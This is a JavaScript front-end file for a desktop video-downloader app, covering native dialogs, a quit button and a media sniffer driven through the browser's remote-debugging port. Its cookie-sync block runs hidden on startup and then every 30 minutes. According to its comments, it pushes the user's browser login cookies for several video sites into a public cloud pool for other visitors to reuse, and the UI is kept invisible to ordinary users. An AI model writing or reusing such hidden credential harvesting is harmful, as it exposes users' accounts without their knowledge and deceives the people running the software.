// web/js/desktop-app.js — 桌面版(pywebview)专属行为脚本。
//
// 由 index.html 在桌面壳环境加载（pywebview 注入 或 打包指纹 isDesktopBuild 命中）。
// ⚠️ 纯 web 环境（Chrome 等浏览器打开 127.0.0.1:8321）也会加载本文件——但浏览器里的
//    pollPicked 已经无害：服务端 cdp_sniffer.mark_desktop_auth 对匿名调用是 no-op（不会
//    把「桌面端登录态」信号写成 False），且 /api/sniffer/picked 仅对带令牌的桌面端出队
//    （匿名轮询返回空、抢不走扩展条目）。所以这里**不再**用 `if (!window.pywebview) return`
//    去拦截——pywebview 注入时机不稳定，过早 return 会连桌面壳自己的轮询一起误杀。
//
// ⚠️ 这是 app 端窗口的专属编辑文件：以后桌面版的新功能（退出/原生桥接/系统托盘等）
//    只改这里，不要写回共享的 web/app.js，也不要让 web 窗口碰本文件。
//
// 复用 web/app.js 暴露的共享能力：window.VDL（el/$/escHtml/request/showError/
// createTaskCard/switchView）。app.js 必须先于本文件执行（index.html 已保证顺序）。
(function () {
  'use strict';

  if (!window.VDL || !window.VDL.el) {
    console.error('[desktop-app] window.VDL 未就绪，跳过桌面专属初始化');
    return;
  }
  const el = window.VDL.el;

  // 显式「退出」/「返回桌面」按钮：仅桌面版(pywebview)显示；浏览器回退模式隐藏（无原生窗口可退）
  (function initQuitButton() {
    const wire = () => {
      const api = window.pywebview && window.pywebview.api;
      if (api && typeof api.quit_app === 'function') {
        el.quitAppBtn.hidden = false;
        el.quitAppBtn.addEventListener('click', () => {
          if (window.confirm('确定退出 VideoDownloader？')) api.quit_app();
        });
      }
      if (api && typeof api.hide_to_desktop === 'function') {
        el.hideToDesktopBtn.hidden = false;
        el.hideToDesktopBtn.addEventListener('click', () => {
          api.hide_to_desktop();
        });
      }
    };
    if (window.pywebview && window.pywebview.api) {
      wire();
    } else {
      document.addEventListener('pywebviewready', wire, { once: true });
    }
  })();

  // 桌面增强命名空间：app.js 通过 window.VDL.desktop 委托纯桌面能力；
  // 纯 web 环境不加载本文件，故 window.VDL.desktop 为 undefined，app.js 自动走 web 回退。
  // 这是 Phase2「前端按端拆分」的增强层归宿——所有「无 web 等价」的桌面行为集中于此。
  const desktop = {
    // 在系统浏览器打开外部链接（OAuth 授权页等）。返回 true=已用原生桥接打开，
    // false=无原生桥接（调用方应回退到 window.open）。
    openExternal(url) {
      const api = window.pywebview && window.pywebview.api;
      if (!(api && typeof api.open_external === 'function')) return Promise.resolve(false);
      const norm = (r) => (typeof r === 'string') ? !r.startsWith('ERROR') : true;
      try {
        const r = api.open_external(url);
        if (r && typeof r.then === 'function') return r.then(norm).catch(() => false);
        return Promise.resolve(norm(r));
      } catch (e) {
        return Promise.resolve(false); // 桥接异常：告知调用方回退
      }
    },
    // 弹出系统文件夹选择框，返回所选目录绝对路径；无桥接或用户取消返回空串。
    // 注意：pywebview 的 api.* 调用返回 Promise，必须 await/then 取值。
    chooseFolder() {
      const api = window.pywebview && window.pywebview.api;
      if (!(api && typeof api.choose_folder === 'function')) return Promise.resolve('');
      const norm = (r) => (typeof r === 'string') ? (r.startsWith('ERROR') ? '' : r) : (r || '');
      try {
        const r = api.choose_folder();
        if (r && typeof r.then === 'function') return r.then(norm).catch(() => '');
        return Promise.resolve(norm(r));
      } catch (e) {
        return Promise.resolve('');
      }
    },
    // 弹出系统多文件选择框，返回绝对路径数组；无桥接或用户取消返回空数组。
    // 注意：pywebview 的 api.* 调用返回 Promise，必须 await/then 取值。
    // kind: 'media'(默认，视频+音频) | 'image'(图片) | 'any'(视频+音频+图片)。
    // 无 kind 的旧调用行为不变；旧二进制不认 kind 时按 media 处理。
    chooseFiles(kind) {
      const api = window.pywebview && window.pywebview.api;
      if (!(api && typeof api.choose_files === 'function')) { return Promise.resolve([]); }
      const norm = (r) => {
        if (!r) return [];
        if (typeof r === 'string') return r.startsWith('ERROR') ? [] : r.split('\n').filter(Boolean);
        if (Array.isArray(r)) return r.filter(Boolean);
        return [];
      };
      try {
        const r = kind ? api.choose_files(kind) : api.choose_files();
        if (r && typeof r.then === 'function') {
          return r.then(norm).catch(() => []);
        }
        return Promise.resolve(norm(r));
      } catch (e) {
        return Promise.resolve([]);
      }
    },
    // 保存抠图结果：弹系统保存面板，用户自选透明 PNG 位置；取消返回 "CANCELLED"，
    // 失败返回 "ERROR: ..."。无桥接时返回空串让调用方走 <a download> 兜底。
    saveMattingFile(jobId, suggestedName) {
      const api = window.pywebview && window.pywebview.api;
      if (!(api && typeof api.save_matting_file_dialog === 'function')) return Promise.resolve('');
      const norm = (r) => (typeof r === 'string') ? r : (r || '');
      try {
        const r = api.save_matting_file_dialog(jobId, suggestedName || 'matting.png');
        if (r && typeof r.then === 'function') return r.then(norm).catch(() => '');
        return Promise.resolve(norm(r));
      } catch (e) {
        return Promise.resolve('');
      }
    },
    // 保存二维码 PNG：弹系统保存面板，用户自选位置。
    // 必须走原生桥——WKWebView 不支持 <a download> 的 blob 下载，直接点会把主框架
    // 导航到 blob: 图片、整个 App 界面被二维码替换（用户 2026-09-21 报的缺陷）。
    // 入参 dataUrl 为 data:image/png;base64,... ；取消返回 "CANCELLED"，失败返回 "ERROR: ..."，
    // 无桥接（网页版）返回空串让调用方走 <a download> 兜底。
    saveQrImage(dataUrl, suggestedName) {
      const api = window.pywebview && window.pywebview.api;
      if (!(api && typeof api.save_qr_image_dialog === 'function')) return Promise.resolve('');
      const norm = (r) => (typeof r === 'string') ? r : (r || '');
      try {
        const r = api.save_qr_image_dialog(dataUrl, suggestedName || '分享二维码.png');
        if (r && typeof r.then === 'function') return r.then(norm).catch(() => '');
        return Promise.resolve(norm(r));
      } catch (e) {
        return Promise.resolve('');
      }
    },
    // 「我的音色」：弹原生文件框选一段参考录音，返回绝对路径；取消返回 ""。
    // 无桥接（网页版）返回 ""，调用方回退为手填路径。
    pickVoiceSample() {
      const api = window.pywebview && window.pywebview.api;
      if (!(api && typeof api.pick_voice_sample === 'function')) return Promise.resolve('');
      const norm = (r) => (typeof r === 'string') ? r : '';
      try {
        const r = api.pick_voice_sample();
        if (r && typeof r.then === 'function') return r.then(norm).catch(() => '');
        return Promise.resolve(norm(r));
      } catch (e) {
        return Promise.resolve('');
      }
    },
    // Qwen3-TTS 本地语音克隆服务起停（选中即起、切走即停），返回 {ok, msg}。
    // 与「用户不用懂端口/服务」的同一套约定；无桥接时返回可读提示。
    startQwen3Tts() {
      const api = window.pywebview && window.pywebview.api;
      if (api && typeof api.start_qwen3tts === 'function') {
        try {
          const r = api.start_qwen3tts();
          if (r && typeof r.then === 'function') return r;
          return Promise.resolve(r);
        } catch (e) {
          return Promise.resolve({ ok: false, msg: '启动失败：' + e });
        }
      }
      return Promise.resolve({ ok: false, msg: '当前环境不支持自动开启，请在桌面版中使用。' });
    },
    stopQwen3Tts() {
      const api = window.pywebview && window.pywebview.api;
      if (api && typeof api.stop_qwen3tts === 'function') {
        try {
          const r = api.stop_qwen3tts();
          if (r && typeof r.then === 'function') return r;
          return Promise.resolve(r);
        } catch (e) {
          return Promise.resolve({ ok: false, msg: '停止失败：' + e });
        }
      }
      return Promise.resolve({ ok: false, msg: '' });
    },
  };
  window.VDL.desktop = desktop;

  // 「Cookie 同步到云端」：仅 App 端，纯后台自动同步，按钮/徽标对用户不可见。
  // - 把本机浏览器各强反爬站(抖音/B站/快手/小红书等)的登录态自动推送到网页版(Railway)
  //   公共池，让网页版访客无需手动粘贴即可复用。
  // - 桌面版常驻时每 30 分钟自动刷新一次（启动后立即同步一次），使网页版共享登录态
  //   保持新鲜。完全后台执行，不打扰用户。
  (function initSyncCookie() {
    const btn = document.createElement('button');
    btn.id = 'syncCookieBtn';
    btn.textContent = '同步 Cookie 到云端';
    btn.type = 'button';
    // 不写内联样式 — 交给 .sidebar-cookie-sync button 类控制（padding/width/font 等）
    // 若未来 sidebar 兜底失效落到 header/body，那时需要 inject 完整样式，目前先不写
    btn.style.cssText = '';
    const badge = document.createElement('span');
    badge.id = 'syncCookieBadge';
    badge.textContent = '';
    badge.style.cssText = '';

    async function syncToCloud(showAlert) {
      // 后台静默同步：showAlert 仅在手动触发时为 true，目前按钮不可见不会传 true。
      const old = btn.textContent;
      btn.disabled = true;
      btn.textContent = '同步中…';
      try {
        const resp = await fetch('/api/cookie/sync/to-cloud', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({}),
        });
        const data = await resp.json().catch(() => ({}));
        if (resp.ok) {
          const t = new Date().toLocaleTimeString();
          badge.textContent = `云端登录态已同步 ${t}（${data.pushed}/${data.total} 站）`;
          if (showAlert) {
            const lines = (data.results || [])
              .map((r) => `· ${r.domain}: ${r.pushed ? '已推送' : '未推送' + (r.reason ? '(' + r.reason + ')' : '')}`)
              .join('\n');
            window.alert(`同步完成（${data.pushed}/${data.total} 站成功）\n\n${lines}`);
          }
        } else {
          badge.textContent = '云端同步未配置/失败';
          if (showAlert) window.alert('同步失败：' + (data.detail || '未知错误'));
        }
      } catch (e) {
        badge.textContent = '云端同步出错';
        if (showAlert) window.alert('同步出错：' + e.message);
      } finally {
        btn.disabled = false;
        btn.textContent = old;
      }
    }

    // 用户视角：按钮/徽标均不可见。wrap 创建后立即隐藏，避免在 sidebar 留下空白
    // （display:none 不占布局空间，连带 badge 一起消失）。
    // 即使完全隐藏 DOM，setInterval 依然按 30min 节奏在后端触发同步。
    const sidebar = document.querySelector('aside.sidebar') || document.querySelector('.sidebar');
    if (sidebar) {
      const wrap = document.createElement('div');
      wrap.id = 'syncCookieWrap';
      wrap.className = 'sidebar-cookie-sync';
      wrap.style.display = 'none';   // ← 用户要求：界面不可见
      wrap.appendChild(btn);
      wrap.appendChild(badge);
      sidebar.insertBefore(wrap, sidebar.firstElementChild);
    } else {
      // sidebar 还不存在时，兜底：对象保留在内存，IIFE 末尾的定时器仍会触发同步；
      // 元素不挂到可视 DOM，对用户依然不可见。
      // 不 append 到 header/body，避免污染布局。
      void btn; void badge;
    }

    // 桌面版就绪后自动同步一次，并每 30 分钟保活（用户要求：固定半个小时自动触发）。
    const wire = () => { syncToCloud(false); };
    if (window.pywebview && window.pywebview.api) {
      wire();
    } else {
      document.addEventListener('pywebviewready', wire, { once: true });
    }
    setInterval(() => syncToCloud(false), 30 * 60 * 1000);

    // 2026-09-25：超管手动入口。默认保持隐藏（普通用户零痕迹）；
    // app.js 的 updateAdminTabVisibility() 在确认 is_admin 后调 setVisible(true)
    // 把按钮显示为「Cookie 池自动上传」，点击走同一 syncToCloud(true) 带结果弹窗。
    window.VDL.cookieSync = {
      run: syncToCloud,
      setVisible(v) {
        const wrap = document.getElementById('syncCookieWrap');
        if (wrap) wrap.style.display = v ? '' : 'none';
        const b = document.getElementById('syncCookieBtn');
        if (b && v) b.textContent = 'Cookie 池自动上传';
      },
    };
  })();

  /* =======================================================================
   * 浏览器嗅探（CDP + 悬浮球，2026-09-27 对标 DataTool）：
   * 连接带 --remote-debugging-port 的浏览器 → 监听各标签页的媒体请求
   * （HLS/DASH 清单、mp4/webm 直链）→ 面板一键下载（带来源页 Referer 防
   * 防盗链 403）；页面内悬浮球点「下载」的项经后端 outbox 自动回流到这里。
   * ======================================================================= */
  (function initSniffer() {
    if (!window.VDL || !window.VDL.request) return;
    const { $, escHtml, request, showError, createTaskCard, trackTask } = window.VDL;

    const POLL_ITEMS_MS = 2000;
    const POLL_PICKED_MS = 3000;
    let panelOpen = false;
    let itemsTimer = null;
    let pickedTimer = null;

    // ---- 样式（一次性注入，类名 vdl-sniff-* 避免冲突） ----
    const css = document.createElement('style');
    css.textContent = `
.vdl-sniff-panel{position:fixed;top:0;right:0;width:420px;max-width:92vw;height:100%;
  background:#fff;box-shadow:-8px 0 32px rgba(0,0,0,.18);z-index:2147483000;display:flex;
  flex-direction:column;font:13px/1.5 -apple-system,"PingFang SC","Microsoft YaHei",sans-serif;color:#222;}
.vdl-sniff-head{padding:14px 16px;border-bottom:1px solid #eee;display:flex;align-items:center;gap:8px;}
.vdl-sniff-head b{font-size:15px;flex:1;}
.vdl-sniff-body{flex:1;overflow:auto;padding:10px 16px;}
.vdl-sniff-status{padding:6px 10px;border-radius:8px;background:#f4f5f7;color:#555;margin-bottom:10px;}
.vdl-sniff-status.on{background:#e8f7ef;color:#0a7d43;}
.vdl-sniff-extbanner{padding:8px 10px;border-radius:8px;background:#eef4ff;border:1px solid #d9e4ff;color:#2b3a55;font-size:12px;line-height:1.6;margin-bottom:10px;}
.vdl-sniff-extbanner.on{background:#e8f7ef;border-color:#bfe8d2;color:#0a7d43;}
.vdl-sniff-actions{display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;}
.vdl-sniff-actions button{border:0;border-radius:8px;padding:7px 12px;cursor:pointer;font-size:12px;}
.vdl-sniff-actions .main{background:#4f46e5;color:#fff;}
.vdl-sniff-actions .ghost{background:#eef;background:#eef0f4;color:#333;}
.vdl-sniff-actions .danger{background:#fdecec;color:#c0392b;}
.vdl-sniff-item{border:1px solid #eee;border-radius:10px;padding:8px 10px;margin-bottom:8px;}
.vdl-sniff-item .k{font-size:11px;font-weight:600;border-radius:4px;padding:1px 6px;margin-right:6px;}
.vdl-sniff-item .k.playlist{background:#e8f7ef;color:#0a7d43;}
.vdl-sniff-item .k.media{background:#eef0ff;color:#4f46e5;}
.vdl-sniff-item .k.segment{background:#fff7e6;color:#b26a00;}
.vdl-sniff-item .u{color:#666;font-size:12px;word-break:break-all;margin:4px 0;}
.vdl-sniff-item .p{color:#999;font-size:11px;margin-bottom:6px;}
.vdl-sniff-item button{border:0;border-radius:6px;padding:4px 10px;cursor:pointer;font-size:12px;margin-right:6px;}
.vdl-sniff-item .dl{background:#4f46e5;color:#fff;}
.vdl-sniff-item .cp{background:#eef0f4;}
.vdl-sniff-empty{color:#999;text-align:center;padding:30px 0;}
`;
    document.head.appendChild(css);

    // ---- 面板骨架 ----
    const badgeBtn = document.createElement('button');
    badgeBtn.type = 'button';
    badgeBtn.className = 'badge';
    badgeBtn.id = 'sniffBadge';
    badgeBtn.title = '连接浏览器嗅探视频流（HLS/直链），含页面悬浮球';
    badgeBtn.textContent = '🔍 浏览器嗅探';
    // 不再等 pywebviewready 才显示：本文件只在桌面壳环境加载，徽标直接常显。
    // （此前靠 wire() 解锁，pywebviewready 事件在动态脚本执行前就已派发时会永远隐藏）
    badgeBtn.hidden = false;

    const panel = document.createElement('div');
    panel.className = 'vdl-sniff-panel';
    panel.hidden = true;
    panel.innerHTML = `
      <div class="vdl-sniff-head"><b>浏览器嗅探</b>
        <button type="button" class="ghost" id="sniffClose" style="border:0;background:#eef0f4;border-radius:8px;padding:6px 10px;cursor:pointer;">关闭</button>
      </div>
      <div class="vdl-sniff-body">
        <div class="vdl-sniff-status" id="sniffStatus">未连接</div>
        <div class="vdl-sniff-extbanner" id="sniffExtBanner">推荐：安装浏览器扩展，在你<b>日常的浏览器</b>里直接嗅探，无需另开浏览器。</div>
        <div class="vdl-sniff-actions">
          <button type="button" class="main" id="sniffStart">开始嗅探</button>
          <button type="button" class="ghost" id="sniffDownloadExt">下载浏览器扩展</button>
          <button type="button" class="danger" id="sniffStop" hidden>停止嗅探</button>
        </div>
        <div class="vdl-sniff-status" style="margin-top:0">提示：点「开始嗅探」后，若浏览器里还没装扩展，会自动打开一个独立调试浏览器（与你日常浏览器的登录态互不相通，Chrome 安全策略限制）。正在播放的流要重新播放一次才能被截到；悬浮球出现在视频页右下角。</div>
        <div id="sniffList"><div class="vdl-sniff-empty">还没有嗅探到媒体流</div></div>
        <div id="sniffExtHelp" hidden></div>
      </div>`;
    // 插入顶栏徽标行（「会员中心」一排，桌面壳专属行）；找不到顶栏才兜底挂 body
    const badgeRow = document.querySelector('#engineBadge')?.parentElement;
    if (badgeRow) badgeRow.insertBefore(badgeBtn, badgeRow.querySelector('#memberBadge'));
    else document.body.appendChild(badgeBtn);
    document.body.appendChild(panel);

    const statusEl = panel.querySelector('#sniffStatus');
    const listEl = panel.querySelector('#sniffList');
    const stopBtn = panel.querySelector('#sniffStop');

    const extBanner = panel.querySelector('#sniffExtBanner');
    const renderStatus = (st) => {
      // 扩展在线（用户日常浏览器）：绿色横幅替代推荐语——装完立刻有确定性反馈
      if (extBanner) {
        if (st.ext_online) {
          extBanner.className = 'vdl-sniff-extbanner on';
          extBanner.innerHTML = '✓ <b>扩展已连接</b>——正在你日常的浏览器中嗅探，播放视频即可，无需另开浏览器。';
        } else {
          extBanner.className = 'vdl-sniff-extbanner';
          extBanner.textContent = '推荐：安装浏览器扩展，在你日常的浏览器里直接嗅探，无需另开浏览器。';
        }
      }
      if (st.state === 'running') {
        statusEl.className = 'vdl-sniff-status on';
        statusEl.textContent = `嗅探中 · 端口 ${st.port} · 已捕获 ${st.items} 条`;
        stopBtn.hidden = false;
      } else if (st.ext_online) {
        statusEl.className = 'vdl-sniff-status on';
        statusEl.textContent = '扩展已连接 ✓（你的浏览器）';
        stopBtn.hidden = true;
      } else if (st.state === 'error') {
        statusEl.className = 'vdl-sniff-status';
        statusEl.textContent = '出错：' + (st.error || '未知错误');
        stopBtn.hidden = true;
      } else {
        statusEl.className = 'vdl-sniff-status';
        statusEl.textContent = '未连接';
        stopBtn.hidden = true;
      }
    };

    const KIND_LABEL = { playlist: 'HLS/DASH', media: '直链', segment: '分片' };

    const renderItem = (it) => {
      const div = document.createElement('div');
      div.className = 'vdl-sniff-item';
      const short = it.url.length > 150 ? it.url.slice(0, 150) + '…' : it.url;
      div.innerHTML =
        `<span class="k ${escHtml(it.kind)}">${KIND_LABEL[it.kind] || escHtml(it.kind)}</span>` +
        `<span style="color:#888;font-size:11px">×${it.count || 1}</span>` +
        `<div class="u">${escHtml(short)}</div>` +
        (it.page_title ? `<div class="p">来源：${escHtml(it.page_title)}</div>` : '') +
        `<button type="button" class="dl">下载</button><button type="button" class="cp">复制链接</button>`;
      div.querySelector('.dl').addEventListener('click', () => downloadItem(it, div));
      div.querySelector('.cp').addEventListener('click', () => {
        navigator.clipboard && navigator.clipboard.writeText(it.url);
      });
      return div;
    };

    const renderItems = (items) => {
      listEl.innerHTML = '';
      if (!items.length) {
        listEl.innerHTML = '<div class="vdl-sniff-empty">还没有嗅探到媒体流</div>';
        return;
      }
      items.forEach((it) => listEl.appendChild(renderItem(it)));
    };

    // 轻量提示条（替代 alert：成功类信息不打断操作，也不用「警告」标题吓人）
    const sniffToast = (msg) => {
      let t = document.getElementById('vdl-sniff-toast');
      if (!t) {
        t = document.createElement('div');
        t.id = 'vdl-sniff-toast';
        t.style.cssText =
          'position:fixed;left:50%;bottom:32px;transform:translateX(-50%);background:#222a38;color:#eaeaea;padding:10px 16px;border-radius:8px;font-size:13px;z-index:10000;box-shadow:0 6px 20px rgba(0,0,0,.4);max-width:80vw;display:none;';
        document.body.appendChild(t);
      }
      t.textContent = msg;
      t.style.display = 'block';
      clearTimeout(t._timer);
      t._timer = setTimeout(() => { t.style.display = 'none'; }, 2600);
    };

    const downloadItem = async (it, div, silent = false) => {
      const btn = div.querySelector('.dl');
      btn.disabled = true;
      btn.textContent = '创建中…';
      try {
        const data = await request('/api/download', {
          method: 'POST',
          body: JSON.stringify({
            url: it.url,
            quality: 'best',
            title: it.page_title || '',
            cookie: it.cookie || '',
            proxy: '',
            extract_script: '',
            format_id: '',
            concurrent_fragments: 0,
            downloader: 'native',
            play_url: '',
            watch_options: [],
            is_hls: it.kind === 'playlist',
            referer: it.referer || '',
          }),
        });
        const refs = createTaskCard(data.task_id, {
          title: it.page_title || '(嗅探流)',
          platform: '嗅探',
        });
        trackTask(data.task_id, refs, '');
        btn.textContent = '已加入下载 ✓';
        sniffToast('✓ 已加入下载队列：' + (it.page_title || it.url.slice(0, 60)));
        return { ok: true, message: '' };
      } catch (e) {
        btn.disabled = false;
        btn.textContent = '下载';
        const msg = (e && e.message) || '未知错误';
        // silent（扩展/悬浮球回流的项，没有可点的面板按钮）：不弹桌面端错误框，
        // 由调用方把原因通过回执送回来源方——否则用户在浏览器里只看到「已发送 ✓」，
        // 桌面端却什么都没发生（用户实测抱怨「点下载没反应」）。
        if (!silent) showError('嗅探下载失败', msg);
        return { ok: false, message: msg };
      }
    };

    // 把后端 /api/extension/info 的「安装步骤」渲染进面板，引导用户把扩展装进浏览器
    const renderExtHelp = (info) => {
      const box = panel.querySelector('#sniffExtHelp');
      if (!box) return;
      const steps = (info && info.install_steps) || [];
      const name = (info && info.name) || '视频工坊媒体嗅探';
      const ver = (info && info.version) || '';
      const zipName = ver ? 'vdl-sniffer-extension-' + ver + '.zip' : 'vdl-sniffer-extension.zip';
      box.hidden = false;
      box.style.cssText =
        'margin-top:10px;padding:10px 12px;background:#f4f6fa;border:1px solid #e3e7ee;border-radius:10px;font-size:12px;line-height:1.7;color:#2b3442;';
      box.innerHTML =
        '<div style="font-weight:600;margin-bottom:6px;">已下载「' + escHtml(name) + '」' +
        (ver ? ' v' + escHtml(ver) : '') + '，按以下步骤装到浏览器：</div>' +
        '<div style="margin-bottom:6px;color:#5a6472;">安装包 <b>' + escHtml(zipName) +
        '</b> 已保存到浏览器默认的「下载」文件夹（访达 → 下载），解压后按下面步骤加载。</div>' +
        (steps.length
          ? '<ol style="margin:0;padding-left:18px;">' + steps.map((s) => '<li>' + escHtml(s) + '</li>').join('') + '</ol>'
          : '<div>打开 chrome://extensions → 开发者模式 → 加载已解压的扩展程序，选择刚下载的文件夹即可。</div>');
    };

    const refresh = async () => {
      try {
        const st = await request('/api/sniffer/status');
        renderStatus(st);
        const list = await request('/api/sniffer/items?limit=60');
        renderItems(list.items || []);
      } catch (e) { /* 面板开着但后端忙：下次再刷 */ }
    };

    // 回执：把「建任务结果」写回服务端，浏览器扩展据此显示成功 / 失败原因
    // （未登录 / 不支持 / 超配额）。没有这条，扩展只能谎报「已发送 ✓」。
    const reportSendResult = (sendId, res) => {
      if (!sendId) return;
      request('/api/sniffer/send-result', {
        method: 'POST',
        body: JSON.stringify({
          send_id: sendId,
          ok: !!(res && res.ok),
          message: (res && res.message) || '',
        }),
      }).catch(() => { /* 回执尽力而为，不影响本地任务 */ });
    };

    // ---- 悬浮球 outbox / 浏览器扩展回流：来源方点「下载」→ 这里自动建任务 ----
    const pollPicked = async () => {
      try {
        const data = await request('/api/sniffer/picked');
        (data.items || []).forEach(async (it) => {
          const res = await downloadItem(Object.assign({}, it, { kind: it.kind || 'media' }),
            { querySelector: () => ({ disabled: false, textContent: '' }) }, true);
          reportSendResult(it.send_id, res);
        });
      } catch (e) { /* 静默 */ }
    };

    badgeBtn.addEventListener('click', () => {
      panel.hidden = !panel.hidden;
      panelOpen = !panel.hidden;
      clearInterval(itemsTimer);
      clearInterval(pickedTimer);
      if (panelOpen) {
        refresh();
        itemsTimer = setInterval(refresh, POLL_ITEMS_MS);
      }
    });
    panel.querySelector('#sniffClose').addEventListener('click', () => {
      panel.hidden = true;
      panelOpen = false;
      clearInterval(itemsTimer);
    });
    panel.querySelector('#sniffStart').addEventListener('click', async (e) => {
      const btn = e.currentTarget;
      btn.disabled = true;
      // 智能连接（2026-10-01）：后端 start() 本身就是「先探测 9222——已有调试浏览器
      // 就直连，没有才启动」；launch=true 一发即覆盖两种情形，无需两个按钮。
      try { renderStatus(await request('/api/sniffer/connect', {
        method: 'POST', body: JSON.stringify({ port: 9222, launch: true }),
      })); } catch (err) { showError('连接失败', (err && err.message) || '未知错误'); }
      btn.disabled = false;
    });
    stopBtn.addEventListener('click', async () => {
      try { renderStatus(await request('/api/sniffer/disconnect', { method: 'POST', body: '{}' })); }
      catch (err) { showError('停止失败', (err && err.message) || '未知错误'); }
    });
    panel.querySelector('#sniffDownloadExt').addEventListener('click', async (e) => {
      const btn = e.currentTarget;
      btn.disabled = true;
      try {
        const info = await request('/api/extension/info');
        // 触发 zip 下载：WKWebView 拦截裸 <a download>，故走 fetch→blob→临时 a 点击（与全站下载同套路）
        const resp = await fetch('/api/extension/package');
        if (!resp.ok) throw new Error('打包失败(' + resp.status + ')');
        const blob = await resp.blob();
        const fname = (info && info.version)
          ? 'vdl-sniffer-extension-' + info.version + '.zip'
          : 'vdl-sniffer-extension.zip';
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = fname;
        document.body.appendChild(a);
        a.click();
        a.remove();
        setTimeout(() => URL.revokeObjectURL(url), 4000);
        renderExtHelp(info);
        sniffToast('✓ 扩展包已下载，按面板步骤安装到浏览器');
      } catch (err) {
        showError('下载扩展失败', (err && err.message) || '未知错误');
      } finally {
        btn.disabled = false;
      }
    });

    // picked 轮询常驻（悬浮球点击不依赖面板是否打开）
    pickedTimer = setInterval(pollPicked, POLL_PICKED_MS);

    // 桌面壳就绪后显示入口徽标
    const wire = () => { badgeBtn.hidden = false; };
    if (window.pywebview && window.pywebview.api) wire();
    else document.addEventListener('pywebviewready', wire, { once: true });
  })();
})();
